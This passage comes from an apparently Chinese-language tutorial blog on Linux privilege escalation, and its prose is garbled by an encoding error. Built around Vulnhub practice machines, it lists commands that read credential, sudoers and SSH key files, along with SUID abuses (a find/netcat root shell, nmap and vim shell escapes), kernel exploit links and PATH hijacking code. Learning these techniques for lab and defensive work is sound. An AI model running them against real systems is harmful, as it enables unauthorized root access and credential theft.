ç»„</p><p><strong>ç¬¬äº”ç»„æ•°æ®</strong></p><pre><code>176</code></pre><p>è¡¨ç¤ºæ–‡ä»¶çš„å¤§å°ä¸ºå¤šå°‘å­—èŠ‚ã€‚å¦‚æœä¸ºä¸€ä¸ªç›®å½•ï¼Œåˆ™ä¸º4096ã€‚</p><p><strong>ç¬¬å…­ç»„æ•°æ®</strong></p><pre><code>5æœˆ  18 2020</code></pre><p>è¡¨ç¤ºæœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´</p><p><strong>ç¬¬ä¸ƒç»„æ•°æ®</strong></p><pre><code>.bash_profile</code></pre><p>è¡¨ç¤ºæ–‡ä»¶åç§°</p><p>å¦‚æœä¸ºç›®å½•ï¼Œr è¡¨ç¤ºå¯ä»¥è¿›å…¥è¯¥ç›®å½•è¿›è¡ŒæŸ¥çœ‹,w è¡¨ç¤ºæ–‡ä»¶å¯ä»¥è¿›è¡Œå¢åŠ ,x è¡¨ç¤ºå¯ä»¥è¿›å…¥è¿™ä¸ªç›®å½•.</p><p>åŒæ ·çš„ï¼Œå¯ä»¥ç”¨æ•°å­—ä»£æ›¿ï¼Œr=4,w=2,x=1ã€‚</p><h1 id="æ€ä¹ˆæ ·ææƒ"><a href="#æ€ä¹ˆæ ·ææƒ" class="headerlink" title="æ€ä¹ˆæ ·ææƒ"></a>æ€ä¹ˆæ ·ææƒ</h1><p>ææƒçš„æœ¬è´¨æ˜¯ä¿¡æ¯æœé›†ã€‚</p><h2 id="åŸºç¡€ä¿¡æ¯æœé›†"><a href="#åŸºç¡€ä¿¡æ¯æœé›†" class="headerlink" title="åŸºç¡€ä¿¡æ¯æœé›†"></a>åŸºç¡€ä¿¡æ¯æœé›†</h2><h3 id="è‡ªåŠ¨åŒ–ä¿¡æ¯æœé›†å·¥å…·"><a href="#è‡ªåŠ¨åŒ–ä¿¡æ¯æœé›†å·¥å…·" class="headerlink" title="è‡ªåŠ¨åŒ–ä¿¡æ¯æœé›†å·¥å…·"></a>è‡ªåŠ¨åŒ–ä¿¡æ¯æœé›†å·¥å…·</h3><p>LinEnum:<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p>linuxprivchecker:<a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a> </p><h3 id="è‡ªåŠ¨åŒ–æ¼æ´æ¢æµ‹å·¥å…·"><a href="#è‡ªåŠ¨åŒ–æ¼æ´æ¢æµ‹å·¥å…·" class="headerlink" title="è‡ªåŠ¨åŒ–æ¼æ´æ¢æµ‹å·¥å…·"></a>è‡ªåŠ¨åŒ–æ¼æ´æ¢æµ‹å·¥å…·</h3><p>linux-exploit-suggester:<a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p>linux-exploit-suggester2:<a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a> </p><h3 id="å†…æ ¸ï¼Œæ“ä½œç³»ç»Ÿï¼Œè®¾å¤‡ä¿¡æ¯"><a href="#å†…æ ¸ï¼Œæ“ä½œç³»ç»Ÿï¼Œè®¾å¤‡ä¿¡æ¯" class="headerlink" title="å†…æ ¸ï¼Œæ“ä½œç³»ç»Ÿï¼Œè®¾å¤‡ä¿¡æ¯"></a>å†…æ ¸ï¼Œæ“ä½œç³»ç»Ÿï¼Œè®¾å¤‡ä¿¡æ¯</h3><pre><code>uname -a    æ‰“å°æ‰€æœ‰å¯ç”¨çš„ç³»ç»Ÿä¿¡æ¯uname -r    å†…æ ¸ç‰ˆæœ¬uname -n    ç³»ç»Ÿä¸»æœºåã€‚uname -m    æŸ¥çœ‹ç³»ç»Ÿå†…æ ¸æ¶æ„ï¼ˆ64ä½/32ä½ï¼‰hostname    ç³»ç»Ÿä¸»æœºåcat /proc/version    å†…æ ¸ä¿¡æ¯cat /etc/*-release   åˆ†å‘ä¿¡æ¯cat /etc/issue       åˆ†å‘ä¿¡æ¯cat /proc/cpuinfo    CPUä¿¡æ¯cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhatls /boot | grep vmlinuz-</code></pre><h3 id="ç”¨æˆ·å’Œç¾¤ç»„"><a href="#ç”¨æˆ·å’Œç¾¤ç»„" class="headerlink" title="ç”¨æˆ·å’Œç¾¤ç»„"></a>ç”¨æˆ·å’Œç¾¤ç»„</h3><pre><code>cat /etc/passwd     åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç”¨æˆ·cat /var/mail/rootcat /var/spool/mail/rootcat /etc/group      åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç»„grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 &#123; print $1&#125;&#39;      åˆ—å‡ºæ‰€æœ‰çš„è¶…çº§ç”¨æˆ·è´¦æˆ·whoami              æŸ¥çœ‹å½“å‰ç”¨æˆ·w                   è°ç›®å‰å·²ç™»å½•ï¼Œä»–ä»¬æ­£åœ¨åšä»€ä¹ˆlast                æœ€åç™»å½•ç”¨æˆ·çš„åˆ—è¡¨lastlog             æ‰€æœ‰ç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„ä¿¡æ¯lastlog â€“u %username%  æœ‰å…³æŒ‡å®šç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„ä¿¡æ¯lastlog |grep -v &quot;Never&quot;  ä»¥å‰ç™»å½•ç”¨æˆ·çš„å®Œ</code></pre><h3 id="ç”¨æˆ·æƒé™ä¿¡æ¯"><a href="#ç”¨æˆ·æƒé™ä¿¡æ¯" class="headerlink" title="ç”¨æˆ·æƒé™ä¿¡æ¯"></a>ç”¨æˆ·æƒé™ä¿¡æ¯</h3><pre><code>whoami        å½“å‰ç”¨æˆ·åid            å½“å‰ç”¨æˆ·ä¿¡æ¯cat /etc/sudoers  è°è¢«å…è®¸ä»¥rootèº«ä»½æ‰§è¡Œsudo -l       å½“å‰ç”¨æˆ·å¯ä»¥ä»¥rootèº«ä»½æ‰§è¡Œæ“ä½œ</code></pre><h3 id="ç¯å¢ƒä¿¡æ¯"><a href="#ç¯å¢ƒä¿¡æ¯" class="headerlink" title="ç¯å¢ƒä¿¡æ¯"></a>ç¯å¢ƒä¿¡æ¯</h3><pre><code>env        æ˜¾ç¤ºç¯å¢ƒå˜é‡set        ç°å®ç¯å¢ƒå˜é‡echo %PATH è·¯å¾„ä¿¡æ¯history    æ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„å†å²å‘½ä»¤è®°å½•pwd        è¾“å‡ºå·¥ä½œç›®å½•cat /etc/profile   æ˜¾ç¤ºé»˜è®¤ç³»ç»Ÿå˜é‡cat /etc/shells    æ˜¾ç¤ºå¯ç”¨çš„shellrccat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logout</code></pre><h3 id="è¿›ç¨‹å’ŒæœåŠ¡"><a href="#è¿›ç¨‹å’ŒæœåŠ¡" class="headerlink" title="è¿›ç¨‹å’ŒæœåŠ¡"></a>è¿›ç¨‹å’ŒæœåŠ¡</h3><pre><code>ps auxps -eftopcat /etc/services</code></pre><p>æŸ¥çœ‹ä»¥root è¿è¡Œçš„è¿›ç¨‹</p><pre><code>ps aux | grep rootps -ef | grep root</code></pre><h3 id="æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶"><a href="#æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶" class="headerlink" title="æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶"></a>æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶</h3><pre><code>ls -alh /usr/bin/ls -alh /sbin/ls -alh /var/cache/yum/dpkg -l</code></pre><h3 id="æœåŠ¡-æ’ä»¶"><a href="#æœåŠ¡-æ’ä»¶" class="headerlink" title="æœåŠ¡/æ’ä»¶"></a>æœåŠ¡/æ’ä»¶</h3><p>æ£€æŸ¥æœ‰æ²¡æœ‰ä¸å®‰å…¨çš„æœåŠ¡é…ç½®ï¼Œå’Œä¸€äº›æœ‰æ¼æ´çš„æ’ä»¶ã€‚</p><pre><code>cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/</code></pre><h3 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h3><pre><code>crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root</code></pre><h3 id="æœ‰æ— æ˜æ–‡å­˜æ”¾ç”¨æˆ·å¯†ç "><a href="#æœ‰æ— æ˜æ–‡å­˜æ”¾ç”¨æˆ·å¯†ç " class="headerlink" title="æœ‰æ— æ˜æ–‡å­˜æ”¾ç”¨æˆ·å¯†ç "></a>æœ‰æ— æ˜æ–‡å­˜æ”¾ç”¨æˆ·å¯†ç </h3><pre><code>grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find , -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;</code></pre><p>Vulnhub ä¸Šçš„é¶æœºå°±ä½“ç°åœ¨ï¼Œé€šè¿‡é‚®ä»¶æ˜æ–‡ä¼ è¾“å¯†ç äº†ï¼Œç„¶åå°±å¯ä»¥é€šè¿‡sshç™»é™†äº†ã€‚è¿›è¡Œæ–°çš„ä¿¡æ¯æœé›†ã€‚</p><h3 id="æœ‰æ— ssh-ç§é’¥"><a href="#æœ‰æ— ssh-ç§é’¥" class="headerlink" title="æœ‰æ— ssh ç§é’¥"></a>æœ‰æ— ssh ç§é’¥</h3><pre><code>cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key</code></pre><h3 id="æŸ¥çœ‹ä¸å½“å‰æœºå™¨é€šä¿¡çš„å…¶ä»–ç”¨æˆ·æˆ–è€…ä¸»æœº"><a href="#æŸ¥çœ‹ä¸å½“å‰æœºå™¨é€šä¿¡çš„å…¶ä»–ç”¨æˆ·æˆ–è€…ä¸»æœº" class="headerlink" title="æŸ¥çœ‹ä¸å½“å‰æœºå™¨é€šä¿¡çš„å…¶ä»–ç”¨æˆ·æˆ–è€…ä¸»æœº"></a>æŸ¥çœ‹ä¸å½“å‰æœºå™¨é€šä¿¡çš„å…¶ä»–ç”¨æˆ·æˆ–è€…ä¸»æœº</h3><pre><code>lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw</code></pre><h3 id="æ—¥å¿—æ–‡ä»¶"><a href="#æ—¥å¿—æ–‡ä»¶" class="headerlink" title="æ—¥å¿—æ–‡ä»¶"></a>æ—¥å¿—æ–‡ä»¶</h3><pre><code>cat /var/log/boot.logcat /var/log/croncat /var/log/syslogcat /var/log/wtmpcat /var/run/utmpcat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</code></pre><h3 id="äº¤äº’å¼shell"><a href="#äº¤äº’å¼shell" class="headerlink" title="äº¤äº’å¼shell"></a>äº¤äº’å¼shell</h3><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;echo os.system(&#39;/bin/bash&#39;)/bin/sh -i</code></pre><h3 id="å¯ææƒSUID-amp-amp-GUID"><a href="#å¯ææƒSUID-amp-amp-GUID" class="headerlink" title="å¯ææƒSUID &amp;&amp; GUID"></a>å¯ææƒSUID &amp;&amp; GUID</h3><blockquote><p>å‚è€ƒèµ„æ–™<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p></blockquote><pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</code></pre><h3 id="æŸ¥çœ‹å¯å†™-æ‰§è¡Œç›®å½•"><a href="#æŸ¥çœ‹å¯å†™-æ‰§è¡Œç›®å½•" class="headerlink" title="æŸ¥çœ‹å¯å†™/æ‰§è¡Œç›®å½•"></a>æŸ¥çœ‹å¯å†™/æ‰§è¡Œç›®å½•</h3><pre><code>find / -writable -type d 2&gt;/dev/null      # world-writeable foldersfind / -perm -222 -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o w -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o x -type d 2&gt;/dev/null     # world-executable foldersfind / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</code></pre><h3 id="æŸ¥çœ‹å®‰è£…è¿‡çš„å·¥å…·"><a href="#æŸ¥çœ‹å®‰è£…è¿‡çš„å·¥å…·" class="headerlink" title="æŸ¥çœ‹å®‰è£…è¿‡çš„å·¥å…·"></a>æŸ¥çœ‹å®‰è£…è¿‡çš„å·¥å…·</h3><pre><code>find / -name perl*find / -name python*find / -name gcc*...</code></pre><h1 id="ææƒæ“ä½œ"><a href="#ææƒæ“ä½œ" class="headerlink" title="ææƒæ“ä½œ"></a>ææƒæ“ä½œ</h1><h3 id="SUID-ææƒ"><a href="#SUID-ææƒ" class="headerlink" title="SUID ææƒ"></a>SUID ææƒ</h3><blockquote><p>ä»€ä¹ˆæ˜¯suidï¼Ÿsuidå…¨ç§°æ˜¯<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on executionã€‚è¿™æ˜¯Linuxç»™å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€ä¸ªå±æ€§ã€‚é€šä¿—çš„ç†è§£ä¸ºå…¶ä»–ç”¨æˆ·æ‰§è¡Œè¿™ä¸ªç¨‹åºçš„æ—¶å€™å¯ä»¥ç”¨è¯¥ç¨‹åºæ‰€æœ‰è€…/ç»„çš„æƒé™ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰ç¨‹åºçš„æ‰€æœ‰è€…æ˜¯0å·æˆ–å…¶ä»–super userï¼ŒåŒæ—¶æ‹¥æœ‰suidæƒé™ï¼Œæ‰å¯ä»¥ææƒã€‚</p></blockquote><p>è¿™é‡Œæ¨è På¸ˆå‚…çš„ <a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><p>å¸¸è§çš„å¯ç”¨æ¥ææƒçš„Linux å¯æ‰§è¡Œæ–‡ä»¶æœ‰ï¼š</p><p>Nmap, Vim, find, bash, more, less, nano, cp</p><p>æŸ¥çœ‹å¯ä»¥suid ææƒçš„å¯æ‰§è¡Œæ–‡ä»¶</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220311170215513.png" alt="image-20220311170215513"></p><ul><li>find</li></ul><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-793add5c-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-793add5c-ba7a-1.png" alt="img"></a></p><pre><code>ls -al /usr/bin/find-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</code></pre><blockquote><p>å®ç”¨ç¨‹åºfindç”¨æ¥åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾æ–‡ä»¶ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæœ‰æ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚ å› æ­¤ï¼Œå¦‚æœé…ç½®ä¸ºä½¿ç”¨SUIDæƒé™è¿è¡Œï¼Œåˆ™å¯ä»¥é€šè¿‡findæ‰§è¡Œçš„å‘½ä»¤éƒ½å°†ä»¥rootèº«ä»½å»è¿è¡Œã€‚</p></blockquote><p>æ¯”å¦‚ï¼šDC -1 é¶æœºå°±æ˜¯åˆ©ç”¨find å‘½ä»¤è¿›è¡Œroot ç”¨æˆ·æ¥æ‰§è¡Œå‘½ä»¤</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-796d1704-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-796d1704-ba7a-1.png" alt="img"></a></p><p>å¤§éƒ¨åˆ†Linux ç³»ç»Ÿéƒ½å®‰è£…äº†ncã€‚ä½¿ç”¨<code>find aaa - exec netcat -lvp 5555 -e /bin/sh \;</code>  å³å¯æˆåŠŸåå¼¹root shell</p><ul><li>nmap</li></ul><p>æ—©æœŸnmap å…·æœ‰äº¤äº’æ¨¡å¼ï¼Œversion 2.02ï½5.21ï¼ˆ5.2.0ï¼‰ã€‚è¿™é‡Œæˆ‘ç”¨metasploitable2 æ¥æ¼”ç¤º</p><p><code>namp -V</code> æŸ¥çœ‹nmap ç‰ˆæœ¬ä¿¡æ¯</p><pre><code>nmap --interactive</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164705-9e3b1b62-b2d2-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164705-9e3b1b62-b2d2-1.png" alt="img"></a></p><p>æˆ‘æœ€å–œæ¬¢çš„<code>Metasploit</code> ä¸­å°±æœ‰åˆ©ç”¨ SUID nmap ææƒçš„exp</p><p><code>search nmap</code> ç„¶ååˆ©ç”¨ <code>exploit/unix/local/setuid_nmap</code> æ¼æ´åˆ©ç”¨æ¨¡å—å³å¯</p><p>5.2.0 ä¹‹åï¼Œnmap è¿˜å¯ä»¥é€šè¿‡æ‰§è¡Œè„šæœ¬æ¥ææƒã€‚</p><pre><code># nse è„šæœ¬ï¼Œshell.nseos.execute(&#39;/bin/sh&#39;)# nmap ææƒnmap --script=shell.nse # åœ¨æŸäº›å‘è¡Œç‰ˆçš„Linux å¯èƒ½ä¼šææƒå¤±è´¥ã€‚å…·ä½“åŸç†ç§»æ­¥p å¸ˆå‚…æ–‡ç« </code></pre><p>æˆ–è€…</p><pre><code>echo &#39;os.execute(&quot;/bin/sh&quot;)&#39; &gt; getshellsudo nmap --script=getshell</code></pre><p>å‚è€ƒDC 6 é¶æœºï¼š<a href="https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83">https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83</a></p><ul><li>vim</li></ul><p>å¦‚æœvim æ˜¯é€šè¿‡SUIDè¿è¡Œï¼Œå°±ä¼šç»§æ‰¿rootç”¨æˆ·çš„æƒé™ã€‚å¯è¯»å–åªæœ‰rootèƒ½è¯»å–çš„æ–‡ä»¶ã€‚</p><pre><code>vim /etc/shadow</code></pre><p>vim è¿è¡Œshell</p><pre><code>vim:set shell=/bin/sh:shell</code></pre><p>åŒç†ï¼Œæ»¡è¶³æ¡ä»¶çš„ less å’Œ more éƒ½å¯ã€‚</p><h3 id="åˆ©ç”¨å†…æ ¸æ¼æ´"><a href="#åˆ©ç”¨å†…æ ¸æ¼æ´" class="headerlink" title="åˆ©ç”¨å†…æ ¸æ¼æ´"></a>åˆ©ç”¨å†…æ ¸æ¼æ´</h3><p>æ¯”å¦‚DC 3 é¶æœºï¼Œå°±æ˜¯åˆ©ç”¨ç³»ç»Ÿå†…æ ¸æ¼æ´æ¥è¿›è¡Œææƒã€‚</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-79a162ac-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-79a162ac-ba7a-1.png" alt="img"></a></p><pre><code>searchsploit Ubuntu 16.04</code></pre><p>å°†exp ä¸‹è½½ä¸‹æ¥ï¼Œè§£å‹ï¼Œç¼–è¯‘ï¼Œè¿è¡Œï¼Œå³å¯get root æƒé™ã€‚</p><pre><code>tar xvf exploit.tar</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-79fd0a12-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-79fd0a12-ba7a-1.png" alt="img"></a></p><p><a href="https://www.exploit-db.com/exploits/39772">https://www.exploit-db.com/exploits/39772</a></p><p>è¿˜æœ‰å¤§åé¼é¼çš„CVE-2016-5195ï¼Œè„ç‰›æ¼æ´ã€‚ï¼ˆLinux kernel &gt;=2.6.22 å¹¶ä¸”Androidä¹Ÿå—å½±å“</p><ul><li><a href="https://github.com/timwr/CVE-2016-5195">https://github.com/timwr/CVE-2016-5195</a></li><li><a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></li><li>å¤ç°å‚è€ƒï¼š<a href="https://www.jianshu.com/p/df72d1ee1e3e">https://www.jianshu.com/p/df72d1ee1e3e</a></li></ul><p>å…¶ä»–å†…æ ¸æ¼æ´ï¼š</p><p>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) â€“ â€˜overlayfsâ€™ Local Root Shell</p><p><a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p><p>Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) â€“ â€˜overlayfsâ€™ Local Root Exploit</p><p><a href="https://www.exploit-db.com/exploits/39166/">https://www.exploit-db.com/exploits/39166/</a></p><p>Linux Kernel 4.3.3 â€“ â€˜overlayfsâ€™ Local Privilege Escalation</p><p><a href="https://www.exploit-db.com/exploits/39230/">https://www.exploit-db.com/exploits/39230/</a></p><blockquote><p>æç¤ºï¼šå†…æ ¸exploitææƒæœ‰é£é™©ï¼Œæœ‰å¯èƒ½ä¼šå´©æºƒç³»ç»Ÿã€‚</p></blockquote><h3 id="åˆ©ç”¨rootæ— å¯†ç æ‰§è¡Œ"><a href="#åˆ©ç”¨rootæ— å¯†ç æ‰§è¡Œ" class="headerlink" title="åˆ©ç”¨rootæ— å¯†ç æ‰§è¡Œ"></a>åˆ©ç”¨rootæ— å¯†ç æ‰§è¡Œ</h3><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œæ¯”å¦‚py,shç­‰æˆ–è€…æ˜¯ä¸€ä¸ªå‘½ä»¤ã€‚è¿™ä¸ªæ–‡ä»¶å¯ä»¥ä»¥rootèº«ä»½è¿è¡Œï¼Œè‹¥åœ¨æ— å¯†ç çš„æƒ…å†µä¸‹æ‰§è¡Œçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹è„šæœ¬å†…å®¹/æˆ–è€…ç›´æ¥æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œåˆ©ç”¨å‘½ä»¤æ¥è¿›è¡Œä¸€äº›æ“ä½œï¼Œæ¥è¿›è¡Œææƒã€‚</p><p>æ¯”å¦‚å¸¸è§çš„ï¼š</p><ul><li>å†™å…¥ä¸€ä¸ªrootèº«ä»½æƒé™çš„ç”¨æˆ·è¿›å…¥/etc/passwd æ–‡ä»¶ä¸­</li></ul><p>è¿™é‡Œä»¥DC 4 ä¸ºä¾‹å­ï¼š</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-7a2357bc-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-7a2357bc-ba7a-1.png" alt="img"></a></p><p><code>teehee -a</code> å°†è¾“å…¥çš„å†…å®¹è¿½åŠ åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸­</p><p>ç®€å•è¯´ä¸‹<code>/etc/passwd</code> å„ä¸ªå­—æ®µçš„å«ä¹‰ï¼š</p><pre><code>username:password:User ID:Group ID:comment:home directory:shell</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-7a3b91c4-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-7a3b91c4-ba7a-1.png" alt="img"></a></p><p>æˆåŠŸè·å–åˆ°root æƒé™ã€‚ç±»ä¼¼çš„æ“ä½œè¿˜æœ‰å¾ˆå¤šï¼Œæ ¸å¿ƒæ€æƒ³ä¸å˜ã€‚</p><h3 id="åˆ©ç”¨ç¯å¢ƒå˜é‡ææƒ"><a href="#åˆ©ç”¨ç¯å¢ƒå˜é‡ææƒ" class="headerlink" title="åˆ©ç”¨ç¯å¢ƒå˜é‡ææƒ"></a>åˆ©ç”¨ç¯å¢ƒå˜é‡ææƒ</h3><p><code>PATH</code> æ˜¯Linux å’Œ Unix  æ“ä½œç³»ç»Ÿä¸­çš„ç¯å¢ƒå˜é‡ï¼Œå®ƒæŒ‡å®šå­˜å‚¨å¯æ‰§è¡Œç¨‹åºçš„æ‰€æœ‰binå’Œsbinç›®å½•ã€‚å½“ç”¨æˆ·åœ¨ç»ˆç«¯ä¸Šæ‰§è¡Œä»»ä½•å‘½ä»¤æ—¶ï¼Œå®ƒä¼šé€šè¿‡PATHå˜é‡æ¥å“åº”ç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¹¶å‘shellå‘é€è¯·æ±‚ä»¥æœç´¢å¯æ‰§è¡Œæ–‡ä»¶ã€‚è¶…çº§ç”¨æˆ·é€šå¸¸è¿˜å…·æœ‰/sbinå’Œ/usr/sbinæ¡ç›®ï¼Œä»¥ä¾¿äºç³»ç»Ÿç®¡ç†å‘½ä»¤çš„æ‰§è¡Œã€‚</p><p>ä½¿ç”¨echoå‘½ä»¤æ˜¾ç¤ºå½“å‰PATHç¯å¢ƒå˜é‡ï¼š</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164053-c0c00b12-b2d1-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164053-c0c00b12-b2d1-1.png" alt="img"></a></p><p>å¦‚æœä½ åœ¨PATHå˜é‡ä¸­çœ‹åˆ°<code>.</code>ï¼Œåˆ™æ„å‘³ç€ç™»å½•ç”¨æˆ·å¯ä»¥ä»å½“å‰ç›®å½•æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶/è„šæœ¬</p><p>æˆ‘ä»¬å…ˆç¼–è¯‘ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶shellã€‚</p><pre><code>#include&lt;unistd.h&gt;void main()&#123;  setuid(0);  setgid(0);  system(&quot;cat /etc/passwd&quot;);&#125;// aaa.c</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164152-e392c15c-b2d1-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164152-e392c15c-b2d1-1.png" alt="img"></a></p><p>åœ¨ç»™è¯¥æ–‡ä»¶èµ‹äºˆæƒé™ã€‚</p><p>ç„¶åæŸ¥çœ‹å®ƒçš„æƒé™å¯ä»¥å‘ç°æ˜¯æœ‰<code>s</code> ä½ï¼Œå³suidã€‚</p><p>ç°åœ¨æˆ‘ä»¬åœ¨ç›®æ 